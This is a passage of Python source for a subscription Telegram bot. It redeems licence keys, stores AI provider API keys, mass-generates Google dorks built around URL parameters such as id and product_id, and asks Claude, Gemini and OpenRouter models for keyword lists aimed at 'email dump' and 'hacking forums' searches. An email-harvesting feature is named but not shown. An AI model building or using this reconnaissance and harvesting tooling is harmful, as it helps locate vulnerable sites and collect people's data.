            "❌ *Iɴᴠᴀʟɪᴅ Kᴇʏ.* Pʟᴇᴀsᴇ Rᴇᴄʜᴇᴄᴋ Aɴᴅ Tʀʏ Aɢᴀɪɴ.\n",
            reply_markup=back_button(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return REDEEM_WAIT_KEY

    info = license_keys[key]
    if info["used_by"] is not None and info["used_by"] != user_id:
        await update.message.reply_text(
            "❌ *Kᴇʏ Aʟʀᴇᴀᴅʏ Usᴇᴅ.*\n\nOɴᴇ Kᴇʏ » Oɴᴇ Usᴀɢᴇ.",
            reply_markup=back_button(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return REDEEM_WAIT_KEY

    delta   = info["delta"]
    expires = datetime.now() + delta
    authorized_users[user_id] = {"plan": info["label"], "expires": expires, "granted_by": key}
    info["used_by"] = user_id
    all_user_ids.add(user_id)

    await update.message.reply_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        f"✅︎ 𝙆𝙚𝙮 𝙍𝙚𝙙𝙚𝙚𝙢𝙚𝙙 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮..!\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
        f"🔑 Kᴇʏ: `{key}`\n"
        f"{info['emoji']} Pʟᴀɴ: *{info['label']}*\n"
        f"📅 Exᴘɪʀᴇs: `{expires.strftime('%Y-%m-%d %H:%M')}`\n",
        parse_mode=ParseMode.MARKDOWN,
    )
    await send_main_menu(update, context)
    return MENU


# ── FALLBACK ───────────────────────────────────────────────────────────────────

async def fallback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id
    all_user_ids.add(user_id)
    if not has_access(user_id):
        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
        return MENU

    waiting_prov = context.user_data.get("waiting_for_ai_key")
    if waiting_prov and is_admin(user_id) and update.message and update.message.text:
        text = update.message.text.strip()
        if text.lower() == "/cancel":
            context.user_data.pop("waiting_for_ai_key", None)
            await update.message.reply_text("❌ Cancelled AI key setup.", reply_markup=make_admin_menu())
            return MENU

        _save_ai_key(waiting_prov, text)
        context.user_data.pop("waiting_for_ai_key", None)
        _prov_name = {"anthropic": "Anthropic Claude", "gemini": "Google Gemini", "openrouter": "OpenRouter"}.get(waiting_prov, waiting_prov)
        masked = text[:6] + "..." + text[-4:] if len(text) > 10 else "***"
        await update.message.reply_text(
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
            f"✅ *{_prov_name} Key Saved!*\n"
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
            f"🔑 Key: `{masked}`\n"
            f"💾 Saved to `ai_keys.json` & runtime active.\n\n"
            f"🚀 `/aigen` is now ready to use with {_prov_name}!",
            reply_markup=make_ai_keys_kb(),
            parse_mode=ParseMode.MARKDOWN,
        )
        return MENU

    await update.message.reply_text("Use /start to open the main menu.", reply_markup=make_main_menu())
    return MENU


# ── PRO DORK GENERATOR COMMANDS ────────────────────────────────────────────────

def _adork_make_conv(cmd_name: str, state_id: int, cmd_fn, file_fn, text_fn):
    return ConversationHandler(
        entry_points=[CommandHandler(cmd_name, cmd_fn)],
        states={state_id: [
            MessageHandler(filters.Document.FileExtension("txt"), file_fn),
            MessageHandler(filters.TEXT & ~filters.COMMAND, text_fn),
        ]},
        fallbacks=[CommandHandler("start", start)],
        allow_reentry=True,
    )


async def adork_keywords_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cfg = adork_get_cfg(context)
    await update.message.reply_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        f"🔑 𝙎𝙚𝙩 𝙆𝙚𝙮𝙬𝙤𝙧𝙙𝙨 𝙁𝙤𝙧 𝘿𝙤𝙧𝙠 𝙑2\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
        f"🧳 Cᴜʀʀᴇɴᴛʟʏ Lᴏᴀᴅᴇᴅ: `{len(cfg['keywords'])}` Kᴇʏᴡᴏʀᴅs\n\n"
        "💡 Sᴇɴᴅ A `.txt` Fɪʟᴇ Tᴏ Aᴅᴅ Mᴏʀᴇ (Oɴᴇ Pᴇʀ Lɪɴᴇ).\n",
        parse_mode=ParseMode.MARKDOWN,
    )
    return _ADORK_WAIT_KEYWORDS

async def _adork_kw_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc  = update.message.document
    file = await context.bot.get_file(doc.file_id)
    data = await file.download_as_bytearray()
    items = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
    adork_get_cfg(context)["keywords"] = items
    await update.message.reply_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        f"✅ `{len(items)}` 𝙆𝙚𝙮𝙬𝙤𝙧𝙙𝙨 𝙇𝙤𝙖𝙙𝙚𝙙..!\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
        f"🔰 Pʀᴇᴠɪᴇᴡ: `{', '.join(items[:5])}{'...' if len(items)>5 else ''}`",
        parse_mode=ParseMode.MARKDOWN,
    )
    return ConversationHandler.END

async def _adork_kw_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    items = _adork_parse_text(update.message.text)
    adork_get_cfg(context)["keywords"] = items
    await update.message.reply_text(f"✅ `{len(items)}` Kᴇʏᴡᴏʀᴅs Sᴇᴛ.!", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END


async def adork_domains_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cfg = adork_get_cfg(context)
    await update.message.reply_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        f"🌍 𝙎𝙚𝙩 𝘿𝙤𝙢𝙖𝙞𝙣 𝙀𝙭𝙩𝙚𝙣𝙨𝙞𝙤𝙣𝙨 (𝘿𝙀)\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
        f"🗺️ Cᴜʀʀᴇɴᴛ:: `{' '.join(cfg['domains'][:8])}`\n\n"
        "💡 Sᴇɴᴅ `.txt` Fɪʟᴇ Wɪᴛʜ Dᴏᴍᴀɪɴs\n"
        "• Sᴇɴᴅ Iɴ Cʜᴀᴛ Bʏ Sᴇᴘᴀʀᴀᴛɪɴɢ Wɪᴛʜ Cᴏᴍᴍᴀs/Nᴇᴡʟɪɴᴇs.\n• Exᴀᴍᴘʟᴇ: `.com, .net, .ru, .pk`",
        parse_mode=ParseMode.MARKDOWN,
    )
    return _ADORK_WAIT_DOMAINS

async def _adork_de_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc  = update.message.document
    file = await context.bot.get_file(doc.file_id)
    data = await file.download_as_bytearray()
    items = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
    adork_get_cfg(context)["domains"] = items
    await update.message.reply_text(f"✅ `{len(items)}` Dᴏᴍᴀɪɴs Sᴇᴛ..!", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END

async def _adork_de_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    items = _adork_parse_text(update.message.text)
    adork_get_cfg(context)["domains"] = items
    await update.message.reply_text(f"✅ `{len(items)}` Dᴏᴍᴀɪɴs Sᴇᴛ..!", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END


async def adork_params_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cfg = adork_get_cfg(context)
    await update.message.reply_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        f"🧤 𝙎𝙚𝙩 𝙐𝙍𝙇 𝙋𝙖𝙧𝙖𝙢𝙚𝙩𝙚𝙧𝙨\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
        f"📛 Cᴜʀʀᴇɴᴛ: `{', '.join(cfg['params'])}`\n\n"
        "💡 Sᴇɴᴅ `.txt` Fɪʟᴇ Oʀ Tʏᴘᴇ Cᴏᴍᴍᴀ-Sᴇᴘᴀʀᴀᴛᴇᴅ.\n• Exᴀᴍᴘʟᴇ: `id, user_id, product_id, cat`",
        parse_mode=ParseMode.MARKDOWN,
    )
    return _ADORK_WAIT_PARAMS

async def _adork_nb_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc  = update.message.document
    file = await context.bot.get_file(doc.file_id)
    data = await file.download_as_bytearray()
    items = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
    adork_get_cfg(context)["params"] = items
    await update.message.reply_text(f"✅ `{len(items)}` Pᴀʀᴀᴍs Sᴇᴛ..!", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END

async def _adork_nb_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    items = _adork_parse_text(update.message.text)
    adork_get_cfg(context)["params"] = items
    await update.message.reply_text(f"✅ `{len(items)}` Pᴀʀᴀᴍs Sᴇᴛ..!", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END


async def adork_filetypes_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cfg = adork_get_cfg(context)
    await update.message.reply_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        f"🔖 𝙎𝙚𝙩 𝙁𝙞𝙡𝙚 𝙏𝙮𝙥𝙚𝙨\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
        f"⚙️ Cᴜʀʀᴇɴᴛ: `{', '.join(cfg['filetypes'])}`\n\n"
        "💡 Sᴇɴᴅ `.txt` Fɪʟᴇ Oʀ Tʏᴘᴇ Cᴏᴍᴍᴀ-Sᴇᴘᴀʀᴀᴛᴇᴅ.\n• Exᴀᴍᴘʟᴇ: `.php, .asp, .aspx, .jsp, .cfm`",
        parse_mode=ParseMode.MARKDOWN,
    )
    return _ADORK_WAIT_FILETYPES

async def _adork_pt_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc  = update.message.document
    file = await context.bot.get_file(doc.file_id)
    data = await file.download_as_bytearray()
    items = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
    adork_get_cfg(context)["filetypes"] = items
    await update.message.reply_text(f"✅ `{len(items)}` Fɪʟᴇᴛʏᴘᴇs Sᴇᴛ..!", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END

async def _adork_pt_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    items = _adork_parse_text(update.message.text)
    adork_get_cfg(context)["filetypes"] = items
    await update.message.reply_text(f"✅ `{len(items)}` Fɪʟᴇᴛʏᴘᴇs Sᴇᴛ!", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END


async def adork_sf_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cfg = adork_get_cfg(context)
    await update.message.reply_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        f"🔍 𝙎𝙚𝙩 𝙎𝙚𝙖𝙧𝙘𝙝 𝙁𝙞𝙡𝙩𝙚𝙧𝙨 (𝙎𝙁)\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
        f"⚙️ Cᴜʀʀᴇɴᴛ: `{', '.join(cfg['sf'])}`\n\n"
        "💡 Usᴇ Cᴏᴍᴍᴀ-Sᴇᴘᴀʀᴀᴛᴇᴅ Oʀ Sᴇɴᴅ `.txt` Fɪʟᴇ.\n• Exᴀᴍᴘʟᴇ: `inurl:, intitle:, allinurl:, allintitle:`",
        parse_mode=ParseMode.MARKDOWN,
    )
    return _ADORK_WAIT_SF

async def _adork_sf_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc  = update.message.document
    file = await context.bot.get_file(doc.file_id)
    data = await file.download_as_bytearray()
    items = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
    adork_get_cfg(context)["sf"] = items
    await update.message.reply_text(f"✅ `{len(items)}` search filters set!", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END

async def _adork_sf_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    items = _adork_parse_text(update.message.text)
    adork_get_cfg(context)["sf"] = items
    await update.message.reply_text(f"✅ `{len(items)}` search filters set!", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END


async def adork_pf_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cfg = adork_get_cfg(context)
    await update.message.reply_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        f"📋 𝙎𝙚𝙩 𝙋𝙖𝙜𝙚 𝙋𝙧𝙚𝙛𝙞𝙭𝙚𝙨 (𝙋𝙁)\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
        f"⚙️ Cᴜʀʀᴇɴᴛ: `{', '.join(cfg['pf'][:8])}`\n\n"
        "💡 Usᴇ Cᴏᴍᴍᴀ-Sᴇᴘᴀʀᴀᴛᴇᴅ Oʀ Sᴇɴᴅ `.txt` Fɪʟᴇ.\n• Exᴀᴍᴘʟᴇ: `index, view, page, item, login, search`",
        parse_mode=ParseMode.MARKDOWN,
    )
    return _ADORK_WAIT_PF

async def _adork_pf_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc  = update.message.document
    file = await context.bot.get_file(doc.file_id)
    data = await file.download_as_bytearray()
    items = [l.strip() for l in data.decode("utf-8", errors="ignore").splitlines() if l.strip()]
    adork_get_cfg(context)["pf"] = items
    await update.message.reply_text(f"✅ `{len(items)}` Pʀᴇғɪxᴇs Sᴇᴛ..!", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END

async def _adork_pf_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    items = _adork_parse_text(update.message.text)
    adork_get_cfg(context)["pf"] = items
    await update.message.reply_text(f"✅ `{len(items)}` Pʀᴇғɪxᴇs Sᴇᴛ..!", parse_mode=ParseMode.MARKDOWN)
    return ConversationHandler.END


async def adork_config_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cfg     = adork_get_cfg(context)
    enabled = set(cfg["enabled"])
    await update.message.reply_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n🛰️ 𝘿𝙤𝙧𝙠 𝙂𝙚𝙣 𝙋𝙧𝙤 — 𝘾𝙪𝙨𝙩𝙤𝙢 𝙋𝙖𝙩𝙩𝙚𝙧𝙣𝙨\n✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n💡 Tᴏɢɢʟᴇ Wʜɪᴄʜ Pᴀᴛᴛᴇʀɴs Tᴏ Usᴇ:",
        reply_markup=_adork_template_keyboard(enabled),
        parse_mode=ParseMode.MARKDOWN,
    )


async def adork_status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cfg = adork_get_cfg(context)
    kw_preview = ", ".join(cfg["keywords"][:5])
    if len(cfg["keywords"]) > 5:
        kw_preview += f"... (+{len(cfg['keywords'])-5} more)"
    enabled_labels = [_ADORK_TEMPLATES[t]["label"] for t in cfg["enabled"] if t in _ADORK_TEMPLATES]
    text = (
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        f"🛰️ 𝘿𝙤𝙧𝙠 𝙂𝙚𝙣 𝙋𝙧𝙤 𝘾𝙤𝙣𝙛𝙞𝙜 (𝘿𝙂𝙋𝘾)\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
        f"🔑 Kᴇʏᴡᴏʀᴅs : `{len(cfg['keywords'])}` Lᴏᴀᴅᴇᴅ"
        + (f"\n   `{kw_preview}`" if cfg["keywords"] else "") + "\n"
        f"🌍 Dᴏᴍᴀɪɴs  : `{len(cfg['domains'])}` — `{' '.join(cfg['domains'][:5])}`\n"
        f"📑 Pᴀʀᴀᴍs   : `{len(cfg['params'])}` — `{', '.join(cfg['params'][:5])}`\n"
        f"🔖 Fɪʟᴇᴛʏᴘᴇs: `{len(cfg['filetypes'])}` — `{' '.join(cfg['filetypes'])}`\n"
        f"🔍 SF       : `{len(cfg['sf'])}` — `{' '.join(cfg['sf'])}`\n"
        f"📋 PF       : `{len(cfg['pf'])}` entries\n\n"
        f"✅ Eɴᴀʙʟᴇᴅ  : `{len(cfg['enabled'])}/10` Tᴇᴍᴘʟᴀᴛᴇs\n"
    )
    for i, label in enumerate(enabled_labels, 1):
        text += f"  `{i:02d}.` `{label}`\n"
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)


async def adork_reset_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["adork_config"] = {
        "keywords":  [],
        "domains":   _ADORK_DEFAULT_DOMAINS.copy(),
        "params":    _ADORK_DEFAULT_PARAMS.copy(),
        "filetypes": _ADORK_DEFAULT_FILETYPES.copy(),
        "sf":        _ADORK_DEFAULT_SF.copy(),
        "pf":        _ADORK_DEFAULT_PF.copy(),
        "enabled":   list(_ADORK_TEMPLATES.keys()),
    }
    await update.message.reply_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        "✅ 𝘿𝙂𝙋𝘾 𝙍𝙚𝙨𝙚𝙩 𝙏𝙤 𝘿𝙚𝙛𝙖𝙪𝙡𝙩𝙨\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
        f"🌍 Dᴏᴍᴀɪɴs: `{len(_ADORK_DEFAULT_DOMAINS)}` | "
        f"📑 Pᴀʀᴀᴍs: `{len(_ADORK_DEFAULT_PARAMS)}` | "
        f"☯️ Tʏᴘᴇs: `{len(_ADORK_DEFAULT_FILETYPES)}`\n\n"
        "• Nᴏᴡ Sᴇᴛ Kᴇʏᴡᴏʀᴅs Usɪɴɢ `/dkeywords`.",
        parse_mode=ParseMode.MARKDOWN,
    )


async def adork_generate_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cfg = adork_get_cfg(context)
    if not cfg["keywords"]:
        await update.message.reply_text("⚠️ Nᴏ Kᴇʏᴡᴏʀᴅs Fᴏᴜɴᴅ..!\nUsᴇ `/dkeywords` Tᴏ Sᴇᴛ.", parse_mode=ParseMode.MARKDOWN)
        return
    if not cfg["enabled"]:
        await update.message.reply_text("⚠️ Nᴏ Tᴇᴍᴘʟᴀᴛᴇs Eɴᴀʙʟᴇᴅ..!\nUsᴇ `/dconfig` Tᴏ Eɴᴀʙʟᴇ Tᴇᴍᴘʟᴀᴛᴇs.", parse_mode=ParseMode.MARKDOWN)
        return
    msg  = await update.message.reply_text("🛰️ *Gᴇɴᴇʀᴀᴛɪɴɢ Dᴏʀᴋ Cᴏᴍʙɪɴᴀᴛɪᴏɴs...*\n_Pʟᴇᴀsᴇ Wᴀɪᴛ..._", parse_mode=ParseMode.MARKDOWN)
    loop  = asyncio.get_running_loop()
    dorks = await loop.run_in_executor(None, adork_generate_all, cfg)
    if not dorks:
        await msg.edit_text("⚠️ Nᴏ Dᴏʀᴋs Gᴇɴᴇʀᴀᴛᴇᴅ. Cʜᴇᴄᴋ Kᴇʏᴡᴏʀᴅs Aɴᴅ Pᴀᴛᴛᴇʀɴs.")
        return
    ts      = datetime.now().strftime("%d%m%y_%H%M%S")
    content = "\n".join(dorks).encode("utf-8")
    await msg.edit_text(f"✅ *{len(dorks):,}* Dᴏʀᴋs Gᴇɴᴇʀᴀᴛᴇᴅ.! Sᴇɴᴅɪɴɢ Fɪʟᴇ...", parse_mode=ParseMode.MARKDOWN)
    await update.message.reply_document(
        document=io.BytesIO(content),
        filename=f"pro_dorks_{len(dorks)}_{ts}.txt",
        caption=(    
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        f"🛰️ 𝘿𝙤𝙧𝙠 𝙂𝙚𝙣 𝙋𝙧𝙤\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
            f"📊 Tᴏᴛᴀʟ Dᴏʀᴋs    : `{len(dorks):,}`\n"
            f"🔑 Kᴇʏᴡᴏʀᴅs       : `{len(cfg['keywords'])}`\n"
            f"🌐 Dᴏᴍᴀɪɴs        : `{len(cfg['domains'])}`\n"
            f"✅ Tᴇᴍᴘʟᴀᴛᴇs Usᴇᴅ : `{len(cfg['enabled'])}/10`\n\n"
        ),
        parse_mode=ParseMode.MARKDOWN,
    )


async def adork_gen_n_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "💡 *Usᴀɢᴇ:* `/dgen <amount>`\n• Exᴀᴍᴘʟᴇ: `/dgen 50000`\n\nSᴇᴛ Kᴇʏᴡᴏʀᴅs Fɪʀsᴛ Usɪɴɢ `/dkeywords`..!",
            parse_mode=ParseMode.MARKDOWN,
        )
        return
    try:
        amount = int(context.args[0].replace(",", ""))
        if amount < 1:
            raise ValueError
        amount = min(amount, 1_000_000)
    except ValueError:
        await update.message.reply_text("⚠️ Aᴍᴏᴜɴᴛ Mᴜsᴛ Bᴇ Pᴏsɪᴛɪᴠᴇ. Exᴀᴍᴘʟᴇ: `/dgen 10000`", parse_mode=ParseMode.MARKDOWN)
        return

    cfg = adork_get_cfg(context)
    if not cfg["keywords"]:
        await update.message.reply_text("⚠️ Nᴏ Kᴇʏᴡᴏʀᴅs Sᴇᴛ!\nUsᴇ `/dkeywords` Tᴏ Sᴇᴛ Kᴇʏᴡᴏʀᴅs.", parse_mode=ParseMode.MARKDOWN)
        return

    prog = await update.message.reply_text(
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
        f"🛰️ 𝘿𝙤𝙧𝙠 𝙂𝙚𝙣 𝙋𝙧𝙤 — 𝙎𝙖𝙢𝙥𝙡𝙞𝙣𝙜 {amount:,} 𝘿𝙤𝙧𝙠𝙨...\n"
        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
        f"🔑 Kᴇʏᴡᴏʀᴅs   : `{len(cfg['keywords']):,}`\n"
        f"🌍 Dᴏᴍᴀɪɴs    : `{len(cfg['domains'])}`\n"
        f"🔢 Pᴀʀᴀᴍs     : `{len(cfg['params'])}`\n"
        f"📄 Fɪʟᴇᴛʏᴘᴇs  : `{len(cfg['filetypes'])}`\n"
        f"✅ Tᴇᴍᴘʟᴀᴛᴇs  : `{len(cfg['enabled'])}/10`\n\n"
        "_🚄 Gᴇɴᴇʀᴀᴛɪɴɢ..._",
        parse_mode=ParseMode.MARKDOWN,
    )
    dorks = await adork_generate_n(cfg, cfg["keywords"], amount)
    if not dorks:
        await prog.edit_text("⚠️ Nᴏ Dᴏʀᴋs Gᴇɴᴇʀᴀᴛᴇᴅ. Cʜᴇᴄᴋ `/dstatus` Tᴏ Mᴀᴋᴇ Sᴜʀᴇ Tᴇᴍᴘʟᴀᴛᴇs Aʀᴇ Eɴᴀʙʟᴇᴅ.")
        return
    ts      = datetime.now().strftime("%d%m%y_%H%M%S")
    content = "\n".join(dorks).encode("utf-8")
    await prog.edit_text(f"✅ `{len(dorks):,}` Dᴏʀᴋs Rᴇᴀᴅʏ — Sᴇɴᴅɪɴɢ Fɪʟᴇ...", parse_mode=ParseMode.MARKDOWN)
    await update.message.reply_document(
        document=io.BytesIO(content),
        filename=f"pro_dorks_{len(dorks)}_{ts}.txt",
        caption=(
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
            f"🛰️ 𝘿𝙤𝙧𝙠 𝙂𝙚𝙣 𝙋𝙧𝙤 — {amount:,} 𝘿𝙤𝙧𝙠𝙨\n"
            f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
            f"📊 Gᴇɴᴇʀᴀᴛᴇᴅ : `{len(dorks):,}`\n"
            f"🔑 Kᴇʏᴡᴏʀᴅs  : `{len(cfg['keywords']):,}`\n"
            f"✅ Tᴇᴍᴘʟᴀᴛᴇs : `{len(cfg['enabled'])}/10`\n\n"
        ),
        parse_mode=ParseMode.MARKDOWN,
    )
    try:
        await prog.delete()
    except Exception:
        pass


# ── EXTENDED FEATURES (AI, Emails, LiveFeed, StatusCheck) ───────────────────────

# ── /emails — harvest emails from any uploaded txt ──────────────────────
# ── Core AI keyword generator ────────────────────────────────────────────
async def _ai_generate_keywords(prompt: str, provider: str) -> tuple[list, str]:
    """
    Returns (keywords_list, error_string).
    provider: "anthropic" | "gemini" | "gpt4o" | "mistral" | "llama"
    """
    _sys = (
        "You are an expert keyword generator for OSINT and web scraping. "
        "Output ONLY keywords, one per line. No numbering, no explanation, "
        "no extra text. Minimum 600 keywords."
    )
    _user = f"Generate 600 highly specific search keywords for: {prompt}"

    import aiohttp as _ah

    # ── Anthropic ────────────────────────────────────────────────────────
    if provider == "anthropic":
        if not _ANTHROPIC_KEY:
            return [], "ANTHROPIC_API_KEY not set"
        try:
            async with _ah.ClientSession() as s:
                async with s.post(
                    "https://api.anthropic.com/v1/messages",
                    headers={
                        "x-api-key": _ANTHROPIC_KEY,
                        "anthropic-version": "2023-06-01",
                        "content-type": "application/json",
                    },
                    json={
                        "model": "claude-sonnet-4-6",
                        "max_tokens": 8000,
                        "system": _sys,
                        "messages": [{"role": "user", "content": _user}],
                    },
                    timeout=_ah.ClientTimeout(total=60),
                ) as r:
                    d = await r.json()
            text = d.get("content", [{}])[0].get("text", "")
            kws  = [l.strip() for l in text.splitlines() if l.strip()]
            return kws, ""
        except Exception as e:
            return [], str(e)[:100]

    # ── Google Gemini ────────────────────────────────────────────────────
    elif provider == "gemini":
        if not _GEMINI_KEY:
            return [], "GEMINI_API_KEY not set"
        try:
            _url = (
                "https://generativelanguage.googleapis.com/v1beta/models/"
                f"gemini-1.5-flash:generateContent?key={_GEMINI_KEY}"
            )
            async with _ah.ClientSession() as s:
                async with s.post(
                    _url,
                    json={
                        "contents": [{"parts": [{"text": _sys + "\n\n" + _user}]}],
                        "generationConfig": {"maxOutputTokens": 8192},
                    },
                    timeout=_ah.ClientTimeout(total=60),
                ) as r:
                    d = await r.json()
            text = d["candidates"][0]["content"]["parts"][0]["text"]
            kws  = [l.strip() for l in text.splitlines() if l.strip()]
            return kws, ""
        except Exception as e:
            return [], str(e)[:100]

    # ── OpenRouter (GPT-4o / Mistral / LLaMA) ───────────────────────────
    elif provider in ("gpt4o", "mistral", "llama", "deepseek"):
        if not _OPENROUTER_KEY:
            return [], "OPENROUTER_API_KEY not set"
        _model_map = {
            "gpt4o":    "openai/gpt-4o",
            "mistral":  "mistralai/mistral-7b-instruct",
            "llama":    "meta-llama/llama-3.1-8b-instruct:free",
            "deepseek": "deepseek/deepseek-r1:free",
        }
        _model = _model_map[provider]
        try:
            async with _ah.ClientSession() as s:
                async with s.post(
                    "https://openrouter.ai/api/v1/chat/completions",
                    headers={
                        "Authorization": f"Bearer {_OPENROUTER_KEY}",
                        "Content-Type":  "application/json",
                        "HTTP-Referer":  "https://t.me/lucifer_bot",
                        "X-Title":       "Lucifer Bot",
                    },
                    json={
                        "model": _model,
                        "max_tokens": 8000,
                        "messages": [
                            {"role": "system", "content": _sys},
                            {"role": "user",   "content": _user},
                        ],
                    },
                    timeout=_ah.ClientTimeout(total=90),
                ) as r:
                    d = await r.json()
            text = d["choices"][0]["message"]["content"]
            kws  = [l.strip() for l in text.splitlines() if l.strip()]
            return kws, ""
        except Exception as e:
            return [], str(e)[:100]

    return [], "Unknown provider"

# ── /aigen — show provider selection buttons ──────────────────────────────
async def aigen_cmd(update, ctx):
    if not has_access(update.effective_user.id):
        await update.message.reply_text("❌ Access denied.")
        return
    prompt = " ".join(ctx.args).strip() if ctx.args else ""
    if not prompt:
        await update.message.reply_text(
            "⚔️ *AI Keywords Generator*\n\n"
            "Usage: `/aigen email dump keywords`\n"
            "Or: `/aigen hacking forums dorks`\n\n"
            "Generates 600+ targeted keywords.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return
    # Store prompt in user_data for callback
    ctx.user_data["aigen_prompt"] = prompt
    await update.message.reply_text(
        f"⚔️ *AI Keywords Generator*\n\n"
        f"📝 Prompt: `{prompt[:60]}`\n\n"
        f"🤖 Select AI Provider:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton(
                "🔵 Claude Sonnet (Anthropic)",
                callback_data="aigen_anthropic")],
            [InlineKeyboardButton(
                "🟢 Gemini 1.5 Flash (Google)",
                callback_data="aigen_gemini")],
            [InlineKeyboardButton(
                "🟡 GPT-4o (OpenRouter)",
                callback_data="aigen_gpt4o")],
            [InlineKeyboardButton(
                "🟠 Mistral 7B (OpenRouter)",
                callback_data="aigen_mistral")],
            [InlineKeyboardButton(
                "🟣 LLaMA 3.1 8B — FREE",
                callback_data="aigen_llama")],
            [InlineKeyboardButton(
                "🔴 DeepSeek R1 — FREE",
                callback_data="aigen_deepseek")],
        ]),
    )

# ── aigen callback — fires when provider button tapped ───────────────────
async def aigen_callback(update, ctx):
    query    = update.callback_query
    provider = query.data.replace("aigen_", "")
    prompt   = ctx.user_data.get("aigen_prompt", "")
    uid      = query.from_user.id

    if not has_access(uid):
        await query.answer("❌ Access denied", show_alert=True)
        return

    if not prompt:
        await query.answer("❌ Prompt missing — use /aigen again", show_alert=True)
        return

    _labels = {
        "anthropic": "Claude Sonnet",
        "gemini":    "Gemini 1.5 Flash",
        "gpt4o":     "GPT-4o",
        "mistral":   "Mistral 7B",
        "llama":     "LLaMA 3.1 8B",
        "deepseek":  "DeepSeek R1",
    }
    _label = _labels.get(provider, provider)

    await query.edit_message_text(
        f"⚔️ *AI Keywords Generator*\n\n"
        f"🤖 Provider: `{_label}`\n"
        f"📝 Prompt: `{prompt[:60]}`\n\n"
        f"⏳ Generating 600+ keywords...",
        parse_mode=ParseMode.MARKDOWN,
    )

    kws, err = await _ai_generate_keywords(prompt, provider)

    if err or not kws:
        await query.edit_message_text(
            f"❌ *Error:* `{err or 'Empty response'}`\n\n"
            f"Check API key for this provider.\n"
            f"Set keys: see /apikeys command",
            parse_mode=ParseMode.MARKDOWN,
        )
